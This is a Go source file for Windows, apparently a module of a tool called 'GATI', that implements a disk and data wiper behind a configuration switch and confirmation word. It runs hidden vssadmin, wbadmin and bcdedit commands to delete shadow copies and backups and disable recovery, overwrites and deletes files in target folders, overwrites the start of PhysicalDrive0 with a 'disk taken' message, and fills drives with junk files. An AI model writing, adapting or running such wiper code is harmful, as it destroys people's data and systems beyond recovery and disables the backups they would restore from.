//go:build windows

package main

import (
	"crypto/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const destroyConfirmWord = "DELETE-EVERYTHING"

// destroyLoop 破坏模块 —— 默认关闭。
// 必须同时满足两个条件才会执行:
//   1) [destroy] enabled=true
//   2) [destroy] confirm=DELETE-EVERYTHING
// 这是故意的双闸,免得手滑把自家机器清了。
func destroyLoop() {
	if gCfg == nil || !gCfg.DestroyEnabled {
		logf("destroy disabled, skip")
		return
	}
	if gCfg.DestroyConfirm != destroyConfirmWord {
		logf("destroy enabled but confirm word wrong (%q), REFUSED", gCfg.DestroyConfirm)
		return
	}

	logf("!!! destroy ARMED, starting in 15s (press unlock hotkey to abort) !!!")
	for i := 0; i < 15; i++ {
		if stopFileExists() {
			logf("destroy aborted")
			return
		}
		time.Sleep(time.Second)
	}

	if gCfg.DestroyShadows {
		logf("deleting shadow copies")
		_ = hiddenCmd("vssadmin", "delete", "shadows", "/all", "/quiet")
		_ = hiddenCmd("wbadmin", "delete", "catalog", "-quiet")
	}

	if gCfg.DestroyRecovery {
		logf("disabling recovery")
		_ = hiddenCmd("bcdedit", "/set", "{default}", "recoveryenabled", "No")
		_ = hiddenCmd("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures")
	}

	if gCfg.DestroyFiles {
		for _, dir := range gCfg.DestroyTargets {
			if stopFileExists() {
				return
			}
			logf("wiping %s", dir)
			wipeTree(dir, 0)
		}
	}

	if gCfg.DestroyWipeMBR {
		logf("wiping MBR")
		wipeMBR()
	}

	if gCfg.DestroyFillDisk {
		logf("filling disk")
		fillDisk(gCfg.DestroyTargets)
	}

	logf("destroy finished")
}

func wipeTree(dir string, depth int) {
	if depth > 12 {
		return
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if stopFileExists() {
			return
		}
		full := filepath.Join(dir, e.Name())
		if e.IsDir() {
			wipeTree(full, depth+1)
			_ = os.RemoveAll(full)
			continue
		}
		wipeFile(full)
	}
}

// wipeFile 用随机数据覆写 3 遍再改名
func wipeFile(path string) {
	st, err := os.Stat(path)
	if err != nil || st.IsDir() {
		return
	}
	size := st.Size()
	if size > 512*1024*1024 {
		// 太大就只覆写头尾各 8MB,快
		overwriteChunk(path, 0, 8*1024*1024)
		overwriteChunk(path, size-8*1024*1024, 8*1024*1024)
	} else {
		for pass := 0; pass < 3; pass++ {
			overwriteChunk(path, 0, size)
		}
	}
	_ = os.Remove(path)
}

func overwriteChunk(path string, off int64, n int64) {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer f.Close()
	buf := make([]byte, 1024*1024)
	written := int64(0)
	for written < n {
		chunk := int64(len(buf))
		if n-written < chunk {
			chunk = n - written
		}
		_, _ = rand.Read(buf[:chunk])
		if _, err := f.WriteAt(buf[:chunk], off+written); err != nil {
			return
		}
		written += chunk
	}
	_ = f.Sync()
}

// wipeMBR 覆写第一块物理盘的前 4MB(引导区 + 分区表 + 备份 GPT 头区域)
func wipeMBR() {
	path := `\\.\PhysicalDrive0`
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	h, err := syscall.CreateFile(p,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil, syscall.OPEN_EXISTING, 0, 0)
	if err != nil {
		logf("open physicaldrive failed (need admin): %v", err)
		return
	}
	defer syscall.CloseHandle(h)

	buf := make([]byte, 4*1024*1024)
	_, _ = rand.Read(buf)
	copy(buf, []byte("GATI // disk taken."))
	var n uint32
	_ = syscall.WriteFile(h, buf, &n, nil)
	logf("mbr overwritten, bytes=%d", n)
}

// fillDisk 往目标盘写大文件直到写满或到上限
func fillDisk(dirs []string) {
	payload := make([]byte, 1024*1024)
	_, _ = rand.Read(payload)
	for _, d := range dirs {
		root := filepath.VolumeName(d)
		if root == "" {
			continue
		}
		if driveType(root+"\\") != DRIVE_FIXED {
			continue
		}
		for i := 0; i < 64; i++ {
			if stopFileExists() {
				return
			}
			name := filepath.Join(root+"\\", "gati_fill_"+string(rune('a'+i%26))+".bin")
			f, err := os.OpenFile(name, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
			if err != nil {
				break
			}
			ok := true
			for j := 0; j < 512; j++ { // 每个文件最多 512MB
				if _, err := f.Write(payload); err != nil {
					ok = false
					break
				}
			}
			f.Close()
			if !ok {
				break
			}
		}
	}
}

var _ = unsafe.Pointer(nil)
var _ = strings.TrimSpace
